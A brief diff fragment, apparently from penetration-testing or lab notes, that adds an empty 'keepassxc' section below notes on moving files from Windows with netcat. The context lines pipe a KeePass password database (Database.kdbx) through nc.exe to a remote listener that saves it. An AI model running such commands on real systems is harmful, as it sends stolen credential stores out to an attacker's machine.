@@ -120,3 +120,8 @@ Transfer files from window using nc
 Get-Content "Database.kdbx" | .\nc.exe 192.168.45.239 5555
 nc -lnvp 5555 > Database.kdbx
 ```
+
+keepassxc 
+```
+
+```
